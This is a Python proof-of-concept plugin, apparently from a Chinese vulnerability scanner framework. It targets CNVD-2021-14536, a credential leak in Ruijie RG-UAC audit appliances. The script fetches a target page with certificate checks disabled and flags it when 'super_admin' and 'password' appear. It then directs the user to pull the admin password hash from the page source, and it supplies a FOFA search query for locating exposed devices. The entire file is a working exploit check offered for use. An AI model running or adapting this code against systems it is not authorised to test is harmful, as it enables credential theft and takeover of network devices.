# -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def vuln_info():
    info = {
        'vuln_name': '锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露',
        'vuln_referer': 'http://wiki.peiqi.tech/',
        'vuln_author': 'Bob',
        'cms_name': '锐捷',
        'vuln_description': '''锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台''',
        'vuln_identifier': '''CNVD-2021-14536''',
        'vuln_class': '信息泄漏',
        'vuln_solution': '''修复建议。''',
        'FofaQuery_type': 'socket',
        'FofaQuery_link': 'all',
        'FofaQuery_rule': 'title="RG-UAC登录页面"',
        'ispoc': 1,
        'isexp': 0
    }
    return info


def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    # 返回参数
    # Result返回是否存在，
    # Result_Info为返回的信息，可以为Paylaod
    # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    # Error_Info无论何时都会输出
    result = {"Result":False,"Result_Info":""}
    # result['Result_Info'] = 'payload'
    # result['Debug_Info'] = 'ddd'
    # result['Error_Info'] = "dsaaaaaaaa"
    vuln_url = url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            # print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(url))
            result['Result'] = True
            result['Result_Info'] = '存在漏洞 ,F12查看源码获取密码md5值(super_admin)'
        else:
            # print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(url))
            result['Result_Info'] = '不存在漏洞'
    except Exception as e:
        func_out('Error',str(e) + str(e.__traceback__.tb_lineno) + '行')
    return result


if __name__ == '__main__':
    url = 'xxx'
    aa = do_poc(url, '', '', '', heads={})
    print(aa)
